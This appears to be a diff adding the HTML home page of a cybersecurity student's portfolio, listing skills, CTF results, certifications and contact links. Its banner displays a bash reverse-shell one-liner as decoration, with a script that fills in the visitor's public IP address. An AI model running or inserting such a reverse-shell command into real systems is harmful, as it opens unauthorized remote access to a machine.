@@ -1,0 +1,132 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ZarkosCypher Cybersecurity Portfolio</title>
+    <link rel="stylesheet" href="assets/css/styles.css">
+	
+	<nav>
+        <ul>
+			<div class="home">
+				<li><a href="index.html">ZarkosCypher</a></li>
+			</div>
+			<div class="options">
+				<li><a href="#about">About Me</a></li>
+				<li><a href="#projects">Projects</a></li>
+				<li><a href="#contact">Contact</a></li>
+			</div>
+		</ul>
+    </nav>
+</head>
+
+  <body>
+    <main>
+		<div class="top-section">
+			<h3>ZarkosCypher</h3>
+			<p> bash -i >& /dev/tcp/<span id="ip-address">Loading...</span>/4444 0>&1 </p>
+			
+		</div>
+		
+		<div class="container">
+		
+			<div class="profile">	
+				<section id="badges">
+					<!iframe src="https://tryhackme.com/api/v2/badges/public-profile?userPublicId=2211668" style='border:none;'><!/iframe>
+					<div class="badge">
+						<img src="https://tryhackme-badges.s3.amazonaws.com/ZarkosCypher.png" alt="Try Hack Me" width="100%" height="100%">
+						<img src="http://www.hackthebox.com/badge/image/1622110" alt="Hack The Box" width="100%" height="100%">
+					</div>
+				</section>
+			</div>
+			
+			<div class="mainpage">
+				<section id="about">
+					<h2>About Me</h2>
+					<p>Hello! I'm ZarkosCypher, a passionate cybersecurity student specializing in penetration testing and ethical hacking. I love solving complex challenges, competing in CTFs, and exploring new tools in the field of cybersecurity.</p>
+				</section>
+
+				<section id="skills">
+					<h2>Skills</h2>
+					<ul>
+						<li>Penetration Testing</li>
+						<li>Vulnerability Assessment</li>
+						<li>Linux and Windows Environments</li>
+						<li>Networking and Protocol Analysis</li>
+						<li>Tools: Nmap, Wireshark, Metasploit, Aircrack-ng</li>
+					</ul>
+				</section>
+
+				<section id="projects">
+					<h2>Projects</h2>
+					<ul>
+						<li><strong>List Of Write Ups:</strong> <a href = "WriteUp.html"><strong>Write Up's</strong> </a></li>
+						<li><strong>Capture The Flag (CTF) Competitions:</strong> Led a team of beginners to place 3rd out of 28 teams in the 2024 SOG competition.</li>
+						<li><strong>Wi-Fi Security Audit:</strong> Conducted penetration tests on a simulated network using tools like Aircrack-ng.</li>
+						<li><strong>Home Lab:</strong> Built and maintained a virtualized environment to practice penetration testing and incident response.</li>
+					</ul>
+				</section>
+
+				<section id="continuing-education-certificates">
+					<h2>Continuing Education Certificates</h2>
+					<ul>
+						<li>Practical Ethical Hacking</li>
+						<li>Security Operations (SOC) 101</li>
+						<li>Practical Phishing Campaigns</li>
+						<li>Linux 100: Fundamentals</li>
+					</ul>
+				</section>
+				
+				<section id="certifications">
+					<h2>Certifications</h2>
+					<ul>
+						<li>SOC Analytics Certification (In Progress)</li>
+						<li>CompTIA Security+ (In Progress)</li>
+						<li>Certified Penetration Tester Specilist (CPTS) (Planned)</li>
+						<li>Certified Bug Bounty Hunter (CBBH) (Planned)</li>
+					</ul>
+				</section>
+
+				<section id="contact">
+					<h2>Contact</h2>
+					<p>If you'd like to contact me, feel free to reach out!</p>
+					<ul>
+						<li>Email: <a href="mailto:zarkoscypher.marital600@simplelogin.com">zarkoscypher.marital600@simplelogin.com</a></li>
+						<li>GitHub: <a href="https://github.com/zarkoscypher">https://github.com/zarkoscypher</a></li>
+					</ul>
+				</section>
+			</div>
+		</div>
+    </main>
+    
+    <footer>
+        <p>&copy; 2024 ZarkosCypher. All rights reserved.</p>
+    </footer>
+    <button id="back-to-top">↑ Top</button>
+    
+	
+	
+	
+	
+	
+	
+	    <script>
+        async function fetchIpAddress() {
+            try {
+                const response = await fetch('https://api.ipify.org?format=json');
+                const data = await response.json();
+                document.getElementById('ip-address').textContent = data.ip;
+            } catch (error) {
+                document.getElementById('ip-address').textContent = "Unable to fetch IP.";
+                console.error("Error fetching IP address:", error);
+            }
+        }
+
+        // Fetch the IP address on page load
+        fetchIpAddress();
+		</script>
+	
+	
+	
+  </body>
+</html>
